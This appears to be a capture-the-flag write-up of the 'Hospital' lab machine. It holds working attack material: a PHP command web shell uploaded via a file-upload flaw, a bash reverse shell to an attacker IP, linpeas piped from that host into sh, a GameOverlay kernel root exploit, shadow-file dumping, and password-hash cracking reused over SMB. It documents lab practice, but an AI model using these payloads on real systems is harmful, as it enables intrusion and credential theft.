# Hospital

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.50.89
[sudo] password for user: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 19:02 UTC
Nmap scan report for 10.129.50.89
Host is up (0.11s latency).
Not shown: 982 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 02:03:01Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-19T02:03:54+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m23s, deviation: 0s, median: 6h59m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-19T02:03:58
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   106.26 ms 10.10.14.1
2   106.30 ms 10.129.50.89

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.94 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.50.89
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 19:06 UTC
Nmap scan report for hospital.htb (10.129.50.89)
Host is up (0.11s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 02:07:43Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-19T02:08:37+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6612/tcp open  msrpc             Microsoft Windows RPC
6635/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp open  mc-nmf            .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 5.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:5.0
Aggressive OS guesses: Linux 5.0 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-19T02:08:42
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m18s, deviation: 0s, median: 6h59m18s

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   106.32 ms 10.10.14.1
2   106.65 ms hospital.htb (10.129.50.89)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 224.90 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.50.89
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 19:10 UTC
Nmap scan report for hospital.htb (10.129.50.89)
Host is up (0.11s latency).
Not shown: 997 open|filtered udp ports (no-response)
PORT    STATE SERVICE      VERSION
53/udp  open  domain       Simple DNS Plus
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-19 02:09:46Z)
123/udp open  ntp          NTP v3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5073.04 seconds
```

### Enumeration of Port 8080/TCP

> http://10.129.50.89:8080

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://10.129.50.89:8080/         
http://10.129.50.89:8080/ [302 Found] Apache[2.4.55], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.129.50.89], RedirectLocation[login.php]
http://10.129.50.89:8080/login.php [200 OK] Apache[2.4.55], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.129.50.89], JQuery[3.2.1], PasswordField[password], Script, Title[Login]
```

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://10.129.50.89:8080/         

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/10.129.50.89-8080/-_23-11-18_19-05-56.txt

Error Log: /home/user/.dirsearch/logs/errors-23-11-18_19-05-56.log

Target: http://10.129.50.89:8080/

[19:05:56] Starting: 
[19:06:00] 301 -  316B  - /js  ->  http://10.129.50.89:8080/js/            
[19:06:01] 403 -  279B  - /.ht_wsr.txt                                     
[19:06:01] 403 -  279B  - /.htaccess.bak1
[19:06:01] 403 -  279B  - /.htaccess.orig
[19:06:01] 403 -  279B  - /.htaccess.sample
[19:06:01] 403 -  279B  - /.htaccess.save
[19:06:01] 403 -  279B  - /.htaccess_extra
[19:06:01] 403 -  279B  - /.htaccess_orig
[19:06:01] 403 -  279B  - /.htaccessBAK
[19:06:01] 403 -  279B  - /.htaccess_sc
[19:06:01] 403 -  279B  - /.htaccessOLD
[19:06:01] 403 -  279B  - /.htaccessOLD2
[19:06:01] 403 -  279B  - /.htm                                            
[19:06:01] 403 -  279B  - /.html
[19:06:01] 403 -  279B  - /.htpasswd_test
[19:06:01] 403 -  279B  - /.htpasswds
[19:06:01] 403 -  279B  - /.httr-oauth
[19:06:03] 403 -  279B  - /.php                                            
[19:06:26] 200 -    0B  - /config.php                                       
[19:06:28] 301 -  317B  - /css  ->  http://10.129.50.89:8080/css/           
[19:06:32] 301 -  319B  - /fonts  ->  http://10.129.50.89:8080/fonts/       
[19:06:35] 301 -  320B  - /images  ->  http://10.129.50.89:8080/images/     
[19:06:35] 403 -  279B  - /images/                                          
[19:06:36] 302 -    0B  - /index.php  ->  login.php                         
[19:06:36] 302 -    0B  - /index.php/login/  ->  login.php                  
[19:06:37] 403 -  279B  - /js/                                              
[19:06:39] 200 -    6KB - /login.php                                        
[19:06:40] 302 -    0B  - /logout.php  ->  login.php                        
[19:06:52] 200 -    5KB - /register.php                                     
[19:06:53] 403 -  279B  - /server-status                                    
[19:06:53] 403 -  279B  - /server-status/                                   
[19:07:01] 200 -    0B  - /upload.php                                       
[19:07:01] 301 -  321B  - /uploads  ->  http://10.129.50.89:8080/uploads/   
[19:07:01] 403 -  279B  - /uploads/                                         
[19:07:02] 403 -  279B  - /vendor/                                          
                                                                             
Task Completed
```

> http://10.129.50.89:8080/register.php

### Windows Enumeration

```c
┌──(user㉿kali)-[~/opt/01_information_gathering/enum4linux-ng]
└─$ python3 enum4linux-ng.py 10.129.50.89
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.50.89
[*] Username ......... ''
[*] Random Username .. 'eubkxsic'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.129.50.89    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.129.50.89    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: hospital.htb

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.50.89    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.129.50.89    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB signing required: true                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           

 ===========================================================
|    Domain Information via SMB session for 10.129.50.89    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
DNS domain: hospital.htb                                                                                                                                                                                                                    
Derived domain: HOSPITAL                                                                                                                                                                                                                    
Derived membership: domain member                                                                                                                                                                                                           
FQDN: DC.hospital.htb                                                                                                                                                                                                                       
NetBIOS computer name: DC                                                                                                                                                                                                                   
NetBIOS domain name: HOSPITAL                                                                                                                                                                                                               

 =========================================
|    RPC Session Check on 10.129.50.89    |
 =========================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ===============================================
|    OS Information via RPC for 10.129.50.89    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
Native LAN manager: not supported                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS build: '17763'                                                                                                                                                                                                                           
OS release: '1809'                                                                                                                                                                                                                          
OS version: '10.0'                                                                                                                                                                                                                          
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 9.60 seconds
```

### Application Enumeration

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/phpinfo.phar

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ cat phpinfo.phar 
<?php phpinfo(); ?>
```

> http://10.129.50.89:8080/uploads/phpinfo.phar

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ cat web.phar 
<?php
$command = $_GET['cmd'];
$handle = popen($command, 'r');
$output = fgets($handle);
echo $output;
?>
```

```c
http://10.129.50.89:8080/uploads/web.phar?cmd=ls
```

```c
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.97%2F9001%200%3E%261%27
```

```c
10.129.50.89:8080/uploads/web.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.97%2F9001%200%3E%261%27
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.50.89] 6604
bash: cannot set terminal process group (982): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$
```

## Stabilizing Shell

```c
www-data@webserver:/var/www/html/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@webserver:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~]
└─$ stty raw -echo;fg
[2]  - continued  nc -lnvp 9001

www-data@webserver:/var/www/html/uploads$ 
www-data@webserver:/var/www/html/uploads$ export XTERM=xterm
www-data@webserver:/var/www/html/uploads$
```

## Enumeration

```c
www-data@webserver:/var/www/html/uploads$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
```

```c
www-data@webserver:/var/www/html$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

| Password |
| --- |
| my$qls3rv1c3! |

```c
www-data@webserver:/var/www/html$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 18
Server version: 10.11.2-MariaDB-1 Ubuntu 23.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```c
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.005 sec)
```

```c
MariaDB [(none)]> use hospital;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)
```

```c
MariaDB [hospital]> select * from users \G;
*************************** 1. row ***************************
        id: 1
  username: admin
  password: $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
created_at: 2023-09-21 14:46:04
*************************** 2. row ***************************
        id: 2
  username: patient
  password: $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
created_at: 2023-09-21 15:35:11
*************************** 3. row ***************************
        id: 3
  username: foobar
  password: $2y$10$CGuXNeMIPagmf2hgFPKbG.IFglyGi9crjezAUO1iLIkq1lFQQTjje
created_at: 2023-11-19 02:12:38
3 rows in set (0.000 sec)

ERROR: No query specified
```

## Cracking the Hash with John

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ cat hash
$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for user: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
patient          (?)     
1g 0:00:07:46 DONE (2023-11-18 20:06) 0.002142g/s 114.4p/s 114.4c/s 114.4C/s polaris1..paolos
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Further Enumeration with LinPEAS

```c
www-data@webserver:/dev/shm$ curl http://10.10.14.97/linpeas.sh | sh
```

```c
╔══════════╣ Users with console
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash                                                                                                                                                                             
root:x:0:0:root:/root:/bin/bash
```

## Privilege Escalation to root via CVE-2023-32629, CVE-2023-2640 GameOverlay Ubuntu Kernel Exploit

```c
www-data@webserver:/dev/shm$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
```

## User Verification with kerbrute

```c
┌──(user㉿kali)-[~/opt/05_password_attacks/kerbrute]
└─$ cat users 
drwilliams
```

```c
┌──(user㉿kali)-[~/opt/05_password_attacks/kerbrute]
└─$ ./kerbrute userenum -d hospital.htb --dc dc.hospital.htb users     

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/18/23 - Ronnie Flathers @ropnop

2023/11/18 20:11:49 >  Using KDC(s):
2023/11/18 20:11:49 >   dc.hospital.htb:88

2023/11/18 20:11:49 >  [+] VALID USERNAME:       drwilliams@hospital.htb
2023/11/18 20:11:49 >  Done! Tested 1 usernames (1 valid) in 0.120 seconds
```

We did another run with `LinPEAS` as root.

```c
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                                                                                                                                                                           
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. 
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::                                                                                                 
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```

### Cracking another Hash

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ cat hash_drwilliams 
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ sudo john hash_drwilliams --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for user: 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (?)     
1g 0:00:00:57 DONE (2023-11-18 20:18) 0.01737g/s 3727p/s 3727c/s 3727C/s raycharles..pl@yboy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| --- | --- |
| drwilliams | qwe123!@# |

```c
┌──(user㉿kali)-[~/opt/05_password_attacks/kerbrute]
└─$ crackmapexec smb hospital.htb -u 'drwilliams' -p 'qwe123!@#' --shares
SMB         hospital.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         hospital.htb    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
SMB         hospital.htb    445    DC               [*] Enumerated shares
SMB         hospital.htb    445    DC               Share           Permissions     Remark
SMB         hospital.htb    445    DC               -----           -----------     ------
SMB         hospital.htb    445    DC               ADMIN$                          Remote Admin
SMB         hospital.htb    445    DC               C$                              Default share
SMB         hospital.htb    445    DC               IPC$            READ            Remote IPC
SMB         hospital.htb    445    DC               NETLOGON        READ            Logon server share 
SMB         hospital.htb    445    DC               SYSVOL          READ            Logon server share
```

```c
┌──(user㉿kali)-[~/opt/05_password_attacks/kerbrute]
└─$ crackmapexec smb hospital.htb -u 'drwilliams' -p 'qwe123!@#' --rid-brute
SMB         hospital.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         hospital.htb    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
SMB         hospital.htb    445    DC               498: HOSPITAL\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         hospital.htb    445    DC               500: HOSPITAL\Administrator (SidTypeUser)
SMB         hospital.htb    445    DC               501: HOSPITAL\Guest (SidTypeUser)
SMB         hospital.htb    445    DC               502: HOSPITAL\krbtgt (SidTypeUser)
SMB         hospital.htb    445    DC               512: HOSPITAL\Domain Admins (SidTypeGroup)
SMB         hospital.htb    445    DC               513: HOSPITAL\Domain Users (SidTypeGroup)
SMB         hospital.htb    445    DC               514: HOSPITAL\Domain Guests (SidTypeGroup)
SMB         hospital.htb    445    DC               515: HOSPITAL\Domain Computers (SidTypeGroup)
SMB         hospital.htb    445    DC               516: HOSPITAL\Domain Controllers (SidTypeGroup)
SMB         hospital.htb    445    DC               517: HOSPITAL\Cert Publishers (SidTypeAlias)
SMB         hospital.htb    445    DC               518: HOSPITAL\Schema Admins (SidTypeGroup)
SMB         hospital.htb    445    DC               519: HOSPITAL\Enterprise Admins (SidTypeGroup)
SMB         hospital.htb    445    DC               520: HOSPITAL\Group Policy Creator Owners (SidTypeGroup)
SMB         hospital.htb    445    DC               521: HOSPITAL\Read-only Domain Controllers (SidTypeGroup)
